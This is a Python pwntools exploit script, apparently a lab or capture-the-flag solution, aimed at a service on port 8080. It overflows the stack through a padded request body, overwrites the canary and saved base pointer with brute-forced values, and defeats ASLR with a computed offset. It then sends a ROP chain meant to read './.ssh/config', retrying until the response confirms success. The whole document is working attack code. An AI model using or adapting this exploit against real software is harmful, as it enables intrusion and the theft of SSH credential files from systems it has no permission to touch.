from pwn import *
from ropchain import give_payload

LP_IP = "0.0.0.0"
LP_PORT = 8080

# values from brute force
canary = [0, 4, 243, 132, 54, 85, 35, 26]
aslr_rbp = [245, 238, 110, 155, 255, 127, 0, 0]
ret_addr = [95, 105, 129, 16, 185, 127, 0, 0]

aslr_ret_addr = int("".join([hex(i)[2:] for i in ret_addr[::-1]]), 16)
actual_ret_addr = 0x995f
offset = aslr_ret_addr - actual_ret_addr
payload = give_payload(offset, './.ssh/config')

# keep trying rop attack until it works
done = False
while not done:
    # set up stack overflow
    socket = remote(LP_IP, LP_PORT)
    socket.send(b"Content-Length: 4096\r\n\r\n")
    for i in range(40):
        socket.send(b"\x69"*100)
    socket.send(b"\x69"*(104))#-48))

    # build exploit string and send it
    msg = b""
    msg += bytes(canary) # canary overwrite
    msg += b"\x00"*16 # padding
    msg += bytes(aslr_rbp) # rbp overwrite
    msg += payload
    socket.send(msg)

    # check that rop was successful
    resp = socket.recvrepeat(2)
    print(len(resp))
    if len(resp)==4242+len(msg):
        done = True
    else:
        socket.close()